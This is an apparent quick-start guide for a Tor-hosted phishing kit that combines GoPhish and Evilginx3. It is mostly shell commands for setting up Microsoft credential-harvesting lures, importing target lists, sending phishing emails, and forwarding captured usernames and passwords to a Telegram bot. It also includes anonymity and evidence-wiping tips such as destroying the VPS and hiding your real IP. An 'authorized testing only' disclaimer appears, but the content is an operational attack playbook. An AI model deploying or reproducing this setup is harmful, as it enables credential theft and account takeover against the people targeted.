# EvilGoPhish Hidden Services - Quick Start Guide

## 🚀 Installation (5 Minutes)

### Step 1: Get the Code
```bash
git clone https://github.com/bitbybit91/evilgophish.git
cd evilgophish
```

### Step 2: Run Setup
```bash
# Basic setup (without Telegram)
sudo ./setup_hidden_services.sh mysite.onion user_id

# With Telegram notifications
sudo ./setup_hidden_services.sh mysite.onion user_id YOUR_BOT_TOKEN YOUR_CHAT_ID
```

**What happens:**
- ✅ Installs Tor and dependencies
- ✅ Configures hidden service
- ✅ Builds all components
- ✅ Creates systemd services
- ✅ Sets up report directories

### Step 3: Get Your .onion Address
```bash
sudo cat /var/lib/tor/evilgophish/hostname
```
**Output:** `abc123xyz789.onion` ← Use this for your phishing campaigns

## 🎯 Start Phishing

### Option A: Using Systemd (Recommended)
```bash
# Start once
sudo systemctl start evilgophish.service

# Enable automatic 2-hour restarts
sudo systemctl enable evilgophish.timer
sudo systemctl start evilgophish.timer

# Check status
sudo systemctl status evilgophish.service
```

### Option B: Manual Start
```bash
sudo /opt/evilgophish/start_all.sh
```

## 📊 Access Interfaces

After starting services:

| Service | URL | Purpose |
|---------|-----|---------|
| GoPhish Admin | https://localhost:3333 | Campaign management |
| EvilFeed | http://localhost:1337 | Live activity feed |

## 🔔 Configure Telegram (Optional)

If you skipped Telegram during setup:

1. **Create bot:** Message @BotFather → `/newbot`
2. **Get Chat ID:** Message @userinfobot
3. **Edit config:**
```bash
sudo nano /opt/evilgophish/telegram_config.json
```
```json
{
  "bot_token": "123456:ABC-DEFghIJK",
  "chat_id": "-987654321",
  "enabled": true
}
```
4. **Restart:**
```bash
sudo systemctl restart evilgophish.service
```

## 📝 Create Campaign

### In GoPhish (https://localhost:3333):
1. **Email Template** → Create template with your phishing content
2. **Landing Pages** → Not used (Evilginx3 handles this)
3. **Sending Profile** → Configure SMTP settings
4. **Users & Groups** → Import target list
5. **Campaigns** → Create new:
   - URL: `https://abc123xyz789.onion/phishing_lure`
   - Send emails

### In Evilginx3:
1. Access terminal: `cd /opt/evilgophish/evilginx3 && sudo ./evilginx3 -g ../gophish/gophish.db`
2. Configure phishlet:
```
phishlets hostname microsoft abc123xyz789.onion
phishlets enable microsoft
lures create microsoft
lures get-url 0
```
3. Use the URL from step 2 in your GoPhish campaign

## 📈 Monitor Results

### Real-Time:
```bash
# Watch logs
sudo journalctl -u evilgophish.service -f

# Check processes
ps aux | grep -E "gophish|evilginx|report_monitor"
```

### View Captured Credentials:
```bash
# List all captures
ls -la /opt/evilgophish/reports/credentials/

# View specific capture
cat /opt/evilgophish/reports/credentials/20231125_143022_abc12345_creds.json
```

### Telegram Notifications:
You'll receive messages like:
```
🔐 New Credentials Captured

🌐 Hidden Service: abc123xyz789.onion
🎯 Phishlet: microsoft
👤 Username: victim@company.com
🔑 Password: P@ssw0rd123
📍 IP: 192.168.1.100
🕐 Time: 2023-11-25 14:30:22 UTC
```

## 🛑 Stop Services

```bash
# Using systemd
sudo systemctl stop evilgophish.service

# Or manual
sudo /opt/evilgophish/stop_all.sh
```

## 🔧 Common Commands

```bash
# Service status
sudo systemctl status evilgophish.service

# View all logs
sudo journalctl -u evilgophish.service --since "1 hour ago"

# Restart service
sudo systemctl restart evilgophish.service

# Check timer
sudo systemctl list-timers evilgophish.timer

# Test Telegram
curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage" \
  -d "chat_id=<CHAT_ID>" \
  -d "text=Test"
```

## 📂 Important Files

```
/opt/evilgophish/
├── telegram_config.json          ← Telegram settings
├── reports/credentials/           ← Your captured creds
├── logs/                          ← All logs
└── start_all.sh / stop_all.sh    ← Manual control

/var/lib/tor/evilgophish/hostname  ← Your .onion address
/etc/systemd/system/evilgophish.*  ← Systemd configs
```

## ⚠️ Troubleshooting

### Services Won't Start
```bash
sudo journalctl -u evilgophish.service -n 50
sudo systemctl status tor
```

### No .onion Address
```bash
sudo systemctl restart tor
sleep 10
sudo cat /var/lib/tor/evilgophish/hostname
```

### Telegram Not Working
```bash
# Test bot
curl https://api.telegram.org/bot<TOKEN>/getMe

# Check config
cat /opt/evilgophish/telegram_config.json

# View monitor logs
tail -f /opt/evilgophish/logs/report_monitor_*.log
```

### No Credentials Captured
1. Check Evilginx3 is running: `ps aux | grep evilginx3`
2. Verify report monitor: `ps aux | grep report_monitor`
3. Check database exists: `ls -la ~/.evilginx/data.db`

## 🔒 Security Reminders

- ✅ This is for **AUTHORIZED TESTING ONLY**
- ✅ Get written permission before testing
- ✅ Use unique .onion per campaign
- ✅ Destroy VPS after use
- ✅ Never expose your real IP
- ✅ Clean reports regularly: `rm -rf /opt/evilgophish/reports/*/*.json`

## 📚 Full Documentation

- **Complete Guide:** [HIDDEN_SERVICES_README.md](HIDDEN_SERVICES_README.md)
- **Implementation Details:** [IMPLEMENTATION_SUMMARY.md](IMPLEMENTATION_SUMMARY.md)
- **Original Docs:** [README.md](README.md)

## 🆘 Getting Help

1. Check documentation above
2. Review logs: `sudo journalctl -u evilgophish.service`
3. Test components individually (see HIDDEN_SERVICES_README.md)
4. Open GitHub issue with logs

---

**Ready to phish?** Start with `sudo ./setup_hidden_services.sh` 🎣

**Remember:** Only use for authorized security testing! 🔐
